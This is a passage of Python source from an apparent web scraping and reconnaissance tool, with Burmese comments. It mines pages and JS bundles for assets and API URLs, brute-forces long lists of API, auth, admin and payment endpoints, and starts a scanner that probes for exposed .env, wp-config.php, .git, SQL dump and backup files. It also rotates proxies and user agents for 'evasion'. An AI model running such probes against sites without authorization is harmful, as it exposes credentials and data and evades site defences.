    for tag in soup.find_all('script', type='application/ld+json'):
        txt = tag.string or ''
        for m in re.finditer(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"', txt):
            assets.add(m.group(1))

    return assets


def extract_css_assets(css: str, css_url: str) -> set:
    assets = set()
    for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
        u = u.strip().strip('"\'')
        if u and not u.startswith('data:') and not u.startswith('#'):
            assets.add(urljoin(css_url, u))
    for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
        assets.add(urljoin(css_url, u))
    return assets


def extract_media_from_js(js_content: str, base_url: str) -> set:
    """
    Mine JS/JSON files for media URLs.
    Useful for React/Vue apps that store image paths in JS bundles.
    """
    assets = set()
    # Full URLs
    for m in re.finditer(
        r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(m.group(1))
    # Relative paths
    for m in re.finditer(
        r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(urljoin(base_url, m.group(1)))
    return assets


# ══════════════════════════════════════════════════
# 🗺️  SITEMAP PARSER
# ══════════════════════════════════════════════════

def fetch_sitemap(base_url: str) -> set:
    """
    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
    """
    urls   = set()

    def _fetch_one_sitemap(url: str, depth: int = 0):
        if depth > 3:   # FIX: recursion depth limit
            return
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code != 200:
                return
            text = r.text
            # Sitemap index → recurse
            if '<sitemapindex' in text:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    sub = m.group(1).strip()
                    if sub not in urls:
                        _fetch_one_sitemap(sub, depth + 1)
            else:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    urls.add(m.group(1).strip())
        except Exception:
            pass

    # Try common sitemap locations
    parsed = urlparse(base_url)
    root   = f"{parsed.scheme}://{parsed.netloc}"

    # Check robots.txt for sitemap pointer first
    try:
        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for m in re.finditer(r'(?i)sitemap:\s*(https?://\S+)', r.text):
                _fetch_one_sitemap(m.group(1).strip())
    except Exception:
        pass

    if not urls:
        for path in ['/sitemap.xml', '/sitemap_index.xml',
                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
                     '/news-sitemap.xml', '/post-sitemap.xml',
                     '/page-sitemap.xml', '/product-sitemap.xml']:
            _fetch_one_sitemap(root + path)

    # Filter to same domain only
    netloc = parsed.netloc
    return {u for u in urls if urlparse(u).netloc == netloc}


# ══════════════════════════════════════════════════
# 🔌  API ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════

# Common API paths for e-commerce + news/blog sites
_API_PATHS_ECOMMERCE = [
    # General Ecommerce
    '/api/products', '/api/v1/products', '/api/v2/products',
    '/api/categories', '/api/v1/categories',
    '/api/items', '/api/inventory',
    '/api/cart', '/api/orders', '/api/v1/orders',
    '/api/checkout', '/api/payments', '/api/shipping', # Added checkout & payments
    '/api/search', '/api/v1/search',
    '/api/users', '/api/v1/users', '/api/customers',   # Added customers
    '/api/config', '/api/settings',
    
    # WooCommerce REST API
    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
    
    # Magento
    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
    '/rest/default/V1/products',
    
    # GraphQL
    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
    
    # Shopify
    '/products.json', '/collections.json', '/pages.json',
    '/collections/all/products.json', '/admin/api/2023-10/products.json',
    
    # General Base
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/rest/v1', '/rest/api',
]

_API_PATHS_NEWS = [
    # WordPress REST API
    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
    
    # General news APIs
    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
    
    # Feeds & Sitemaps
    '/api/feed', '/feed.json', '/feed/json',
    '/rss', '/rss.xml', '/feed', '/feed.rss',
    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
    
    # Ghost CMS
    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
    
    # Strapi
    '/api/articles?populate=*', '/api/posts?populate=*',
    
    # Drupal JSON:API
    '/jsonapi/node/article', '/jsonapi/node/page',
]

_API_PATHS_GENERAL = [
    # Health & Info
    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
    '/version', '/api/version', '/info', '/api/info',
    
    # Documentation & Swagger
    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
    '/docs', '/api/docs', '/redoc', '/api/redoc',
    
    # Well-known & Discovery
    '/.well-known/security.txt', '/.well-known/core-config',
]

# ----------------- အသစ်ထပ်တိုးထားသောအပိုင်းများ ----------------- #

_API_PATHS_AUTH = [
    # Login & Authentication
    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
    '/api/auth/login', '/api/users/login', '/api/admin/login',
    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
    
    # Tokens (JWT, OAuth)
    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
    
    # Current User Profile & Logout
    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
    '/api/logout', '/api/auth/logout',
    
    # WordPress Specific Auth Plugins (JWT Authentication)
    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
]

_API_PATHS_ADMIN = [
    # Admin Panels & Dashboards
    '/api/admin', '/api/v1/admin', '/admin/api',
    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
    '/api/admin/users', '/api/admin/settings',
    '/admin/dashboard.json', '/api/stats', '/api/metrics',
    
    # Spring Boot Actuator (Java)
    '/actuator/health', '/actuator/info', '/manage/health', '/manage/info'
]

# ── API paths တိုးချဲ့ ────────────────────────────
_API_PATHS_MOBILE = [
    # Mobile / App APIs
    '/api/v1/app', '/api/v2/app', '/api/mobile',
    '/api/v1/config', '/api/v2/config',
    '/api/notifications', '/api/v1/notifications',
    '/api/v1/feed', '/api/v2/feed',
    '/api/social', '/api/friends', '/api/followers',
    '/api/messages', '/api/v1/messages',
    '/api/upload', '/api/media', '/api/files',
    '/api/analytics', '/api/events', '/api/tracking',
]

_API_PATHS_FINANCE = [
    # Fintech / Payment / Crypto
    '/api/payments', '/api/v1/payments', '/api/transactions',
    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
    '/api/exchange', '/api/rates', '/api/currency',
    '/api/invoice', '/api/billing', '/api/subscriptions',
    '/api/v1/subscriptions', '/api/plans',
    '/api/crypto', '/api/coins', '/api/market',
    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
]

_API_PATHS_SAAS = [
    # SaaS / Dashboard
    '/api/workspaces', '/api/projects', '/api/teams',
    '/api/members', '/api/invitations', '/api/roles',
    '/api/reports', '/api/exports', '/api/imports',
    '/api/webhooks', '/api/integrations', '/api/plugins',
    '/api/audit', '/api/logs', '/api/activity',
    # Laravel / Sanctum / Passport
    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
    # Django REST Framework
    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
    # FastAPI / Starlette
    '/docs', '/redoc', '/openapi.json',
    # Next.js API routes
    '/api/_next', '/api/auth/[...nextauth]', '/api/auth/session',
    '/api/auth/csrf', '/api/auth/providers',
    # Supabase / Firebase-style
    '/rest/v1/', '/auth/v1/', '/storage/v1/',
]

ALL_API_PATHS = list(dict.fromkeys(
    _API_PATHS_ECOMMERCE +
    _API_PATHS_NEWS      +
    _API_PATHS_GENERAL   +
    _API_PATHS_AUTH      +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_ADMIN     +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_MOBILE    +
    _API_PATHS_FINANCE   +
    _API_PATHS_SAAS
))


# ── API URL patterns in JS bundles ─────────────
_JS_API_PATTERNS = [
    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
]

def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
    found = set()
    for pat in _JS_API_PATTERNS:
        for m in pat.findall(js_text):
            url = m.strip()
            if not url or len(url) < 4:
                continue
            if url.startswith('/'):
                url = base_root + url
            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
                continue
            if url.startswith('http') or url.startswith('/'):
                found.add(url)
    return list(found)


def _extract_api_urls_from_html(html: str, base_root: str) -> list:
    """HTML source ထဲက API references mine လုပ်"""
    found = set()
    soup  = BeautifulSoup(html, 'html.parser')

    # data-* attributes
    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
                if val.startswith('/') or val.startswith('http'):
                    url = (base_root + val) if val.startswith('/') else val
                    found.add(url.split('?')[0])

    # Inline scripts
    for script in soup.find_all('script'):
        if script.string:
            for url in _extract_api_urls_from_js(script.string, base_root):
                found.add(url.split('?')[0])

    # <link rel="..."> and <a href="..."> with /api/
    for tag in soup.find_all(['link', 'a'], href=True):
        href = tag['href']
        if '/api/' in href or '/graphql' in href:
            url = (base_root + href) if href.startswith('/') else href
            found.add(url.split('?')[0])

    return list(found)


def _mine_js_bundles(html: str, root: str, proxies) -> list:
    """External JS files တွေ download ပြီး API URLs ထုတ်"""
    soup = BeautifulSoup(html, 'html.parser')
    js_urls = []
    for tag in soup.find_all('script', src=True):
        src = tag['src']
        if not src: continue
        if src.startswith('//'):
            src = 'https:' + src
        elif src.startswith('/'):
            src = root + src
        if src.startswith('http') and ('chunk' in src or 'bundle' in src or
                'main' in src or 'app' in src or 'vendor' in src or 'index' in src):
            js_urls.append(src)

    found = set()
    for js_url in js_urls[:8]:   # max 8 JS bundles
        try:
            r = requests.get(js_url, headers=HEADERS, timeout=10, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code == 200 and len(r.text) > 100:
                for url in _extract_api_urls_from_js(r.text, root):
                    found.add(url.split('?')[0])
        except Exception:
            pass
    return list(found)


def _check_robots_and_sitemap(root: str, proxies) -> list:
    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
    found = set()
    # robots.txt — Disallow paths with /api/
    try:
        r = requests.get(root + '/robots.txt', headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if line.lower().startswith(('disallow:', 'allow:')):
                    path = line.split(':', 1)[1].strip()
                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
                        found.add(root + path.split('*')[0].rstrip('$'))
    except Exception:
        pass
    return list(found)


def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
    """
    Comprehensive API discovery:
    1. Predefined path brute-force (ALL_API_PATHS)
    2. HTML source mining (data-* attrs, inline scripts)
    3. JS bundle mining (fetch/axios/url patterns)
    4. robots.txt / sitemap discovery
    5. CORS header detection
    Returns: {"found": [...], "js_mined": [...], "html_mined": [...],
              "robots": [...], "stats": {...}}
    """
    parsed  = urlparse(base_url)
    root    = f"{parsed.scheme}://{parsed.netloc}"

    # ── Phase 0: Fetch homepage for mining ───────
    homepage_html = None
    try:
        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r0.status_code == 200:
            homepage_html = r0.text
    except Exception:
        pass

    # ── Phase 1: HTML + JS mining (parallel) ─────
    html_mined = []
    js_mined   = []
    robots_found = []

    if homepage_html:
        if progress_cb: progress_cb("🔍 HTML source mining...")
        html_mined = _extract_api_urls_from_html(homepage_html, root)

        if progress_cb: progress_cb("📦 JS bundle mining...")
        js_mined   = _mine_js_bundles(homepage_html, root, None)

    if progress_cb: progress_cb("🤖 robots.txt scanning...")
    robots_found = _check_robots_and_sitemap(root, None)

    # ── Phase 2: Path brute-force ─────────────────
    found  = []
    seen   = set()

    def _probe(path: str) -> dict | None:
        url = root + path if path.startswith('/') else path
        try:
            r = requests.get(
                url,
                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
                timeout=7, verify=False,
                allow_redirects=True,
                proxies=proxy_manager.get_proxy()
            )
            ct  = r.headers.get('Content-Type', '')
            cors = r.headers.get('Access-Control-Allow-Origin', '')
            size = len(r.content)

            endpoint = {
                "url":    url,
                "status": r.status_code,
                "cors":   cors if cors else None,
                "size_b": size,
                "preview": "",
                "type":   "OTHER",
                "method": "GET",
            }

            if r.status_code in (401, 403):
                endpoint["type"] = "PROTECTED"
                return endpoint

            if r.status_code in (405,):   # Method Not Allowed → endpoint exists
                endpoint["type"] = "PROTECTED"
                endpoint["note"] = "POST only"
                return endpoint

            if r.status_code == 200 and size > 5:
                body = r.text[:400].strip()
                if 'json' in ct or body.startswith(('{', '[')):
                    endpoint["type"]    = "JSON_API"
                    endpoint["preview"] = body[:150]
                    # Try to detect if it's GraphQL
                    if '/graphql' in url or ('"data"' in body and '"errors"' in body):
                        endpoint["type"] = "GRAPHQL"
                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
                    endpoint["type"]    = "XML/RSS"
                    endpoint["preview"] = body[:100]
                elif 'html' in ct and ('/swagger' in url or '/redoc' in url or '/docs' in url):
                    endpoint["type"]    = "API_DOCS"
                    endpoint["preview"] = "Swagger/OpenAPI docs"
                elif size > 20:
                    endpoint["type"]    = "OTHER"
                    endpoint["preview"] = body[:80]
                else:
                    return None
                return endpoint
        except Exception:
            pass
        return None

    # ── Probe ALL paths (brute-force) ─────────────
    # Also probe mined URLs
    all_probe_paths = list(ALL_API_PATHS)
    # Add mined paths (path-only)
    for mined_url in (html_mined + js_mined + robots_found):
        try:
            p = urlparse(mined_url).path
            if p and p not in all_probe_paths and len(p) < 150:
                all_probe_paths.append(p)
        except Exception:
            pass

    total = len(all_probe_paths)
    if progress_cb:
        progress_cb(f"🔌 Path scanning: `{total}` paths...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
        done = 0
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            try:
                result = fut.result(timeout=10)
                if result and result["url"] not in seen:
                    seen.add(result["url"])
                    found.append(result)
            except Exception:
                pass
            if progress_cb and done % 15 == 0:
                progress_cb(
                    f"🔌 Scanning: `{done}/{total}`\n"
                    f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                    f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
                    f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                )

    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
                   "API_DOCS": 3, "PROTECTED": 4, "OTHER": 5}
    found.sort(key=lambda x: _type_order.get(x["type"], 9))

    return {
        "found":       found,
        "js_mined":    list(set(js_mined)),
        "html_mined":  list(set(html_mined)),
        "robots":      robots_found,
        "stats": {
            "total_probed":   total,
            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
            "other":          sum(1 for e in found if e["type"] == "OTHER"),
            "js_urls_found":  len(js_mined),
            "html_urls_found":len(html_mined),
        }
    }



def get_internal_links(html: str, base_url: str) -> set:
    soup    = BeautifulSoup(html, 'html.parser')
    netloc  = urlparse(base_url).netloc
    links   = set()
    for a in soup.find_all('a', href=True):
        h = a['href']
        if h.startswith(('#','mailto:','tel:','javascript:')): continue
        full = urljoin(base_url, h)
        p    = urlparse(full)
        if p.netloc == netloc:
            links.add(p._replace(fragment='').geturl())
    return links



# ══════════════════════════════════════════════════
# ✂️  FILE SPLITTER
# ══════════════════════════════════════════════════

def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
    part_size = int(part_mb * 1024 * 1024)
    base  = zip_path.replace('.zip','')
    parts = []
    num   = 1
    with open(zip_path,'rb') as f:
        while True:
            chunk = f.read(part_size)
            if not chunk: break
            p = f"{base}.part{num:02d}.zip"
            with open(p,'wb') as pf: pf.write(chunk)
            parts.append(p)
            num += 1
    return parts

def needs_split(path: str) -> bool:
    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024


# ══════════════════════════════════════════════════
# 🛡️  VULNERABILITY SCANNER  v4
#     - Cloudflare catch-all detection
#     - Baseline fingerprint comparison
#     - Adaptive delay (anti-rate-limit)
#     - Real subdomain verification
# ══════════════════════════════════════════════════

_COMMON_SUBDOMAINS = [
    "api", "admin", "dev", "staging", "test",
    "beta", "app", "portal", "dashboard", "panel",
    "manage", "backend", "internal", "static",
    "mail", "backup", "vpn", "git", "gitlab",
    "jenkins", "ci", "build", "docs", "help",
    "shop", "store", "blog", "status", "monitor",
    "db", "database", "phpmyadmin", "cdn", "media",
    "assets", "files", "upload", "img", "images",
    "auth", "login", "sso", "oauth", "api2",
]

_VULN_PATHS = [
    # CRITICAL — Credentials
    ("/.env",                     "🔑 .env file",               "CRITICAL"),
    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
    ("/config.php",               "🔑 config.php",              "HIGH"),
    ("/config.yml",               "🔑 config.yml",              "HIGH"),
    ("/config.json",              "🔑 config.json",             "HIGH"),
    ("/database.yml",             "🔑 database.yml",            "HIGH"),
    ("/settings.py",              "🔑 settings.py",             "HIGH"),
    # CRITICAL — VCS
    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
    # CRITICAL — Backups
    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
    # HIGH — Admin panels
    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
    ("/login",                    "🔐 Login Page",              "LOW"),
    # HIGH — Logs
    ("/error.log",                "📋 error.log",               "HIGH"),
    ("/access.log",               "📋 access.log",              "HIGH"),
    ("/debug.log",                "📋 debug.log",               "HIGH"),
    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
    # MEDIUM — Server info
    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
    ("/web.config",               "⚙️ web.config",             "HIGH"),
    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
    # LOW
    ("/composer.json",            "📦 composer.json",           "LOW"),
    ("/package.json",             "📦 package.json",            "LOW"),
    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
    # INFO
    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
]

_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
_SEC_HEADERS = {
    "Strict-Transport-Security": ("HSTS",           "HIGH"),
    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
    "Referrer-Policy":           ("Referrer-Policy","LOW"),
    "Permissions-Policy":        ("Permissions-Policy","LOW"),
}
_FAKE_SIGS = [
    b"404", b"not found", b"page not found",
    b"does not exist", b"no such file",
]

# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
_UA_LIST = [
    # ── Chrome — Windows (latest) ────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # ── Chrome — Windows (slightly older, still common) ──────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    # ── Chrome — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Chrome — Linux ───────────────────────────────────────────────
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Firefox — Windows ────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Firefox — macOS ──────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:128.0) Gecko/20100101 Firefox/128.0',
    # ── Firefox — Linux ──────────────────────────────────────────────
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    # ── Safari — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    # ── Edge — Windows ───────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
